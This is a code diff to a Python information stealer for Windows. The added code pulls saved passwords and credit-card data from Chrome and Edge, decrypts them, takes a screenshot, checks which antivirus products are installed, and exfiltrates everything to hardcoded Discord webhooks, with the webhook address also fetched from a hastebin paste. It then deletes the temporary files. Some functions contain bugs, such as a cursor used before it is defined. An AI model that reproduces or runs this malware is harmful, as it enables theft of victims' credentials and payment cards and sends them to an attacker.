@@ -1,3 +1,27 @@
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
+from cryptography.hazmat.backends import default_backend
+from dhooks import Webhook, File
+from PIL import ImageGrab
+from sys import argv
+from time import sleep
+from threading import Thread
+from datetime import datetime
+from base64 import b64decode
+from email import encoders
+from shutil import copyfile
+import cryptography
+import win32api
+import win32con
+import ctypes.wintypes
+import ctypes
+from urllib.parse import urlencode
+import http.cookiejar as cookiejar
+import smtplib
+import zipfile
+import platform
+import win32gui
+import pywintypes
 import os
 if os.name != "nt":
     exit()
@@ -19,7 +43,7 @@ from datetime import timezone, datetime, timedelta
 from Crypto.Cipher import AES
 import win32com.shell.shell as shell
 
-url = "pastebin or hastebin with discord webhook url"
+url = "https://hastebin.com/raw/akocowasoy"
 r = requests.get(url)
 webhook_url = r.text
 
@@ -134,84 +158,6 @@ def has_payment_methods(token):
         pass
 
 
-def get_chrome_datetime(chromedate):
-    """Return a `datetime.datetime` object from a chrome format datetime
-    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
-    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
-
-
-def get_encryption_key():
-    LOCAL_state_path = os.path.join(os.environ["USERPROFILE"],
-                                    "AppData", "LOCAL", "Google", "Chrome",
-                                    "User Data", "LOCAL State")
-    with open(LOCAL_state_path, "r", encoding="utf-8") as f:
-        LOCAL_state = f.read()
-        LOCAL_state = json.loads(LOCAL_state)
-
-    key = base64.b64decode(LOCAL_state["os_crypt"]["encrypted_key"])
-    key = key[5:]
-    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-
-
-def decrypt_password(password, key):
-    try:
-        # get the initialization vector
-        iv = password[3:15]
-        password = password[15:]
-        # generate cipher
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        # decrypt password
-        return cipher.decrypt(password)[:-16].decode()
-    except BaseException:
-        try:
-            return str(
-                win32crypt.CryptUnprotectData(
-                    password, None, None, None, 0)[1])
-        except BaseException:
-            # not supported
-            return ""
-
-
-def chrome_date_and_time(chrome_data):
-    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
-
-
-def fetching_encryption_key():
-    LOCAL_computer_directory_path = os.path.join(
-        os.environ["USERPROFILE"], "AppData", "LOCAL", "Google", "Chrome",
-        "User Data", "LOCAL State")
-
-    with open(LOCAL_computer_directory_path, "r", encoding="utf-8") as f:
-        LOCAL_state_data = f.read()
-        LOCAL_state_data = json.loads(LOCAL_state_data)
-
-    encryption_key = base64.b64decode(
-        LOCAL_state_data["os_crypt"]["encrypted_key"])
-
-    encryption_key = encryption_key[5:]
-
-    return win32crypt.CryptUnprotectData(
-        encryption_key, None, None, None, 0)[1]
-
-
-def password_decryption(password, encryption_key):
-    try:
-        iv = password[3:15]
-        password = password[15:]
-
-        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
-
-        return cipher.decrypt(password)[:-16].decode()
-    except BaseException:
-
-        try:
-            return str(
-                win32crypt.CryptUnprotectData(
-                    password, None, None, None, 0)[1])
-        except BaseException:
-            return "No Passwords"
-
-
 def main():
     embeds = []
     working = []
@@ -286,56 +232,374 @@ def main():
         pass
 
 
-key = fetching_encryption_key()
-db_path = os.path.join(
-    os.environ["USERPROFILE"],
-    "AppData",
-    "LOCAL",
-    "Google",
-    "Chrome",
-    "User Data",
-    "default",
-    "Login Data")
-filename = "ChromePasswords.db"
-shutil.copyfile(db_path, filename)
-shutil.copy(filename, f"C:\\Users\\{os.getenv('username')}\\Saved Games")
-db = sqlite3.connect(filename)
-cursor = db.cursor()
 
-cursor.execute(
-       "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
-        "order by date_last_used")
+# DISCORD WEBHOOK:
+hook = Webhook(
+    "https://discord.com/api/webhooks/888513394460749844/pfCqw5LxNCFPBlKAoZykfYLAEm41hqEoKNZ6m1VCr-vRw-JbG0UgXphzeWak-BSY6XRu")
+# DISCORD WEBHOOK 2:
+hooks = Webhook(
+    "https://discord.com/api/webhooks/888513394460749844/pfCqw5LxNCFPBlKAoZykfYLAEm41hqEoKNZ6m1VCr-vRw-JbG0UgXphzeWak-BSY6XRu")
 
-for row in cursor.fetchall():
-        main_url = row[0]
-        login_page_url = row[1]
-        user_name = row[2]
-        decrypted_password = password_decryption(row[3], key)
-        date_of_creation = row[4]
-        last_usuage = row[5]
+APP_DATA_PATH = os.environ['LOCALAPPDATA']
+DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
 
-        if user_name or decrypted_password:
-            demoname = f"{os.getenv('username')}_demo.txt"
-            with open(demoname, "w") as file1:
-                file1.write(f"URL: {login_page_url} \n")
-                file1.write(f"User: {user_name} \n")
-                file1.write(f"Password: {decrypted_password} \n")
+NONCE_BYTE_SIZE = 12
 
-            webhook = discord.Webhook.partial(
-                11111111111111110,  # your webhook id
-                # your webhook token
-                'sfdjnjidf2398fni90trefqvt43t',
-                adapter=discord.RequestsWebhookAdapter())
 
-            with open(file=demoname, mode='rb') as f:
-                my_file = discord.File(f)
-                webhook.send('', username='demo', file=my_file)
+def encrypt(cipher, plaintext, nonce):
+    cipher.mode = modes.GCM(nonce)
+    encryptor = cipher.encryptor()
+    ciphertext = encryptor.update(plaintext)
+    return (cipher, ciphertext, nonce)
 
-            os.remove(demoname)
+
+def decrypt(cipher, ciphertext, nonce):
+    cipher.mode = modes.GCM(nonce)
+    decryptor = cipher.decryptor()
+    return decryptor.update(ciphertext)
+
+
+def get_cipher(key):
+    cipher = Cipher(
+        algorithms.AES(key),
+        None,
+        backend=default_backend()
+    )
+    return cipher
+
+
+def decryptionDPAPI(encrypted):
+    import ctypes
+    import ctypes.wintypes
+
+    class DATA_BLOB(ctypes.Structure):
+        _fields_ = [('cbData', ctypes.wintypes.DWORD),
+                    ('pbData', ctypes.POINTER(ctypes.c_char))]
+
+    p = ctypes.create_string_buffer(encrypted, len(encrypted))
+    blobin = DATA_BLOB(ctypes.sizeof(p), p)
+    blobout = DATA_BLOB()
+    retval = ctypes.windll.crypt32.CryptUnprotectData(
+        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
+    if not retval:
+        raise ctypes.WinError()
+    result = ctypes.string_at(blobout.pbData, blobout.cbData)
+    ctypes.windll.kernel32.LocalFree(blobout.pbData)
+    return result
+
+
+def unix_decrypt(encrypted):
+    if sys.platform.startswith('linux'):
+        password = 'peanuts'
+        iterations = 1
+    else:
+        raise NotImplementedError
+
+    from Crypto.Cipher import AES
+    from Crypto.Protocol.KDF import PBKDF2
+
+    salt = 'saltysalt'
+    iv = ' ' * 16
+    length = 16
+    key = PBKDF2(password, salt, length, iterations)
+    cipher = AES.new(key, AES.MODE_CBC, IV=iv)
+    decrypted = cipher.decrypt(encrypted[3:])
+    return decrypted[:-ord(decrypted[-1])]
+
+
+def localdata_key():
+    jsn = None
+    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
+        jsn = json.loads(str(f.readline()))
+    return jsn["os_crypt"]["encrypted_key"]
+
+
+def aes_decrypt(encrypted_txt):
+    encoded_key = localdata_key()
+    encrypted_key = base64.b64decode(encoded_key.encode())
+    encrypted_key = encrypted_key[5:]
+    key = decryptionDPAPI(encrypted_key)
+    nonce = encrypted_txt[3:15]
+    cipher = get_cipher(key)
+    return decrypt(cipher, encrypted_txt[15:], nonce)
+
+
+class ChromePassword:
+    def __init__(self):
+        self.passwordList = []
+
+    def get_chrome_db(self):
+        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
+        _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
+        if os.path.exists(_temp_path):
+            os.remove(_temp_path)
+        shutil.copyfile(_full_path, _temp_path)
+        self.show_password(_temp_path)
+
+    def show_password(self, db_file):
+        conn = sqlite3.connect(db_file)
+        _sql = 'select signon_realm,username_value,password_value from logins'
+        for row in conn.execute(_sql):
+            host = row[0]
+            if host.startswith('android'):
+                continue
+            name = row[1]
+            value = self.chrome_decrypt(row[2])
+            _info = 'HOSTNAME: %s\nUSER: %s\nPASSWORD: %s\n\n' % (
+                host, name, value)
+            self.passwordList.append(_info)
+        conn.close()
+        os.remove(db_file)
+
+    def chrome_decrypt(self, encrypted_txt):
+        if sys.platform == 'win32':
+            try:
+                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
+                    decrypted_txt = decryptionDPAPI(encrypted_txt)
+                    return decrypted_txt.decode()
+                elif encrypted_txt[:3] == b'v10':
+                    decrypted_txt = aes_decrypt(encrypted_txt)
+                    return decrypted_txt[:-16].decode()
+            except WindowsError:
+                return None
         else:
-            continue
-cursor.close()
-db.close()
+            try:
+                return unix_decrypt(encrypted_txt)
+            except NotImplementedError:
+                return None
+
+    def save_passwords(self):
+        with open('C:\\ProgramData\\Passwords.txt', 'w', encoding='utf-8') as f:
+            f.writelines(self.passwordList)
+
+
+if __name__ == "__main__":
+    Main = ChromePassword()
+    Main.get_chrome_db()
+    Main.save_passwords()
+
+if os.path.exists('C:\\Program Files\\Windows Defender'):
+    av = 'Windows Defender'
+if os.path.exists('C:\\Program Files\\AVAST Software\\Avast'):
+    av = 'Avast'
+if os.path.exists('C:\\Program Files\\AVG\\Antivirus'):
+    av = 'AVG'
+if os.path.exists('C:\\Program Files\\Avira\\Launcher'):
+    av = 'Avira'
+if os.path.exists('C:\\Program Files\\IObit\\Advanced SystemCare'):
+    av = 'Advanced SystemCare'
+if os.path.exists('C:\\Program Files\\Bitdefender Antivirus Free'):
+    av = 'Bitdefender'
+if os.path.exists('C:\\Program Files\\COMODO\\COMODO Internet Security'):
+    av = 'Comodo'
+if os.path.exists('C:\\Program Files\\DrWeb'):
+    av = 'Dr.Web'
+if os.path.exists('C:\\Program Files\\ESET\\ESET Security'):
+    av = 'ESET'
+if os.path.exists('C:\\Program Files\\GRIZZLY Antivirus'):
+    av = 'Grizzly Pro'
+if os.path.exists('C:\\Program Files\\Kaspersky Lab'):
+    av = 'Kaspersky'
+if os.path.exists('C:\\Program Files\\IObit\\IObit Malware Fighter'):
+    av = 'Malware fighter'
+if os.path.exists('C:\\Program Files\\360\\Total Security'):
+    av = '360 Total Security'
+else:
+    pass
+
+# SCREENSHOT:
+screen = ImageGrab.grab()
+screen.save(os.getenv('ProgramData') + '\\Screenshot.jpg')
+screen = open('C:\\ProgramData\\Screenshot.jpg', 'rb')
+screen.close()
+screenshot = File('C:\\ProgramData\\Screenshot.jpg')
+
+# PASSWORDS:
+zname = r'C:\\ProgramData\\Passwords.zip'
+newzip = zipfile.ZipFile(zname, 'w')
+newzip.write(r'C:\\ProgramData\\Passwords.txt')
+newzip.write(r'C:\\ProgramData\\Screenshot.jpg')
+newzip.close()
+passwords = File('C:\\ProgramData\\Passwords.zip')
+
+
+# SEND THOSE VARIABLES:
+hook.send("screenshot:", file=screenshot)
+hook.send("passwords:", file=passwords)
+os.remove('C:\\ProgramData\\Passwords.txt')
+os.remove('C:\\ProgramData\\Screenshot.jpg')
+os.remove('C:\\ProgramData\\Passwords.zip')
+
+# CHROME GRAB: (2) | SENDS CREDIT CARD INFORMATION
+
+
+def get_master_key():
+    try:
+        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
+                  "r", encoding='utf-8') as f:
+            local_state = f.read()
+            local_state = json.loads(local_state)
+    except:
+        pass
+        exit()
+    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    master_key = master_key[5:]
+    master_key = ctypes.windll.crypt32.CryptUnprotectData(
+        (master_key, None, None, None, 0)[1])
+    return master_key
+
+
+def decrypt_payload(cipher, payload):
+    return cipher.decrypt(payload)
+
+
+def generate_cipher(aes_key, iv):
+    return AES.new(aes_key, AES.MODE_GCM, iv)
+
+
+def decrypt_password(buff, master_key):
+    try:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = generate_cipher(master_key, iv)
+        decrypted_pass = decrypt_payload(cipher, payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
+    except Exception as e:
+        pass
+
+
+def get_password():
+    master_key = get_master_key()
+    login_db = os.environ['USERPROFILE'] + os.sep + \
+        r'AppData\Local\Google\Chrome\User Data\default\Login Data'
+    try:
+        shutil.copy2(login_db,
+                     "Loginvault.db")
+    except:
+        pass
+
+    try:
+        cursor.execute(
+            "SELECT action_url, username_value, password_value FROM logins")
+        for r in cursor.fetchall():
+            url = r[0]
+            username = r[1]
+            encrypted_password = r[2]
+            decrypted_password = decrypt_password(
+                encrypted_password, master_key)
+            if username != "" or decrypted_password != "":
+                hook.send(f"URL: " + url + "\nUSER: " + username +
+                          "\nPASSWORD: " + decrypted_password + "\n" + "*" * 10 + "\n")
+    except Exception as e:
+        pass
+
+    cursor.close()
+    conn.close()
+    try:
+        os.remove("Loginvault.db")
+    except Exception as e:
+        pass
+
+
+def get_credit_cards():
+    master_key = get_master_key()
+    login_db = os.environ['USERPROFILE'] + os.sep + \
+        r'AppData\Local\Google\Chrome\User Data\default\Web Data'
+    shutil.copy2(login_db,
+                 "CCvault.db")
+    conn = sqlite3.connect("CCvault.db")
+    cursor = conn.cursor()
+
+    try:
+        cursor.execute("SELECT * FROM credit_cards")
+        for r in cursor.fetchall():
+            username = r[1]
+            encrypted_password = r[4]
+            decrypted_password = decrypt_password(
+                encrypted_password, master_key)
+            expire_mon = r[2]
+            expire_year = r[3]
+            hook.send(f"CARD-NAME: " + username + "\nNUMBER: " + decrypted_password + "\nEXPIRY M: " +
+                      str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")
+
+    except Exception as e:
+        pass
+
+    cursor.close()
+    conn.close()
+    try:
+        os.remove("CCvault.db")
+    except Exception as e:
+        pass
+
+
+# MICROSOFT EDGE GRAB | SENDS CREDIT CARD INFORMATION & PASSWORDS
+
+def get_password1():
+    master_key = get_master_key()
+    login_db = os.environ['USERPROFILE'] + os.sep + \
+        r'AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'
+    try:
+        shutil.copy2(login_db,
+                     "Loginvault.db")
+    except:
+      pass
+
+    try:
+        cursor.execute(
+            "SELECT action_url, username_value, password_value FROM logins")
+        for r in cursor.fetchall():
+            url = r[0]
+            username = r[1]
+            encrypted_password = r[2]
+            decrypted_password = decrypt_password(
+                encrypted_password, master_key)
+            if username != "" or decrypted_password != "":
+                hooks.send(f"URL: " + url + "\nUSER: " + username +
+                           "\nPASSWORD: " + decrypted_password + "\n" + "*" * 10 + "\n")
+    except Exception as e:
+        pass
+
+    cursor.close()
+    conn.close()
+    try:
+        os.remove("Loginvault.db")
+    except Exception as e:
+        pass
+
+
+def get_credit_cards1():
+    master_key = get_master_key()
+    login_db = os.environ['USERPROFILE'] + os.sep + \
+        r'AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'
+    try:
+        shutil.copy2(login_db, "CCvault.db")
+    except:
+        pass
+
+    try:
+        cursor.execute("SELECT * FROM credit_cards")
+        for r in cursor.fetchall():
+            username = r[1]
+            encrypted_password = r[4]
+            decrypted_password = decrypt_password(
+                encrypted_password, master_key)
+            expire_mon = r[2]
+            expire_year = r[3]
+            hooks.send(f"CARD-NAME: " + username + "\nNUMBER: " + decrypted_password + "\nEXPIRY M: " +
+                       str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")
+
+    except Exception as e:
+        pass
+
+    cursor.close()
+    conn.close()
+    try:
+        os.remove("CCvault.db")
+    except Exception as e:
+        pass
+
 
 try:
         os.remove(filename)
